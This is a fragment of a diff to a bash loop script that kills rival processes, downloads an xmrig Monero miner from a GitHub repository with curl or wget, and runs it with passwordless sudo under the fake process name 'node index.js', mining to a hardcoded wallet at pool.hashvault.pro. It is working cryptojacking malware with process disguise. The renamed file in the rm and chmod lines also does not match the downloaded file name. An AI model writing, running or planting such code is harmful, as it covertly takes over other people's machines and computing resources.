@@ -29,7 +29,7 @@ while true; do
     pkill -f syst3md
     pkill -9 start
 
-    rm -f xmr_linux_$arch
+    rm -f xmr_$arch
     if command -v curl >/dev/null 2>&1; then
         curl -LO https://github.com/jimy20s/xmr/raw/refs/heads/main/xmrig_$arch
     elif command -v wget >/dev/null 2>&1; then
@@ -40,7 +40,7 @@ while true; do
     fi
 
 
-    chmod +x xmr_linux_$arch
+    chmod +x xmr_$arch
     if sudo -n true 2>/dev/null; then
         sudo -n bash -c "exec -a \"node index.js\" \"./xmrig_$arch -o pool.hashvault.pro:443 -u 83CT41sGwJW8MsjcNeALMFHBoqMLfSwcqLAcB9w2sFhJBC6y5kGGoX1HmqPkBLCnjZgn52kAzye3EiTBbyjo2LJB1TEQsqs -p linux --tls -t $thread \""
     else
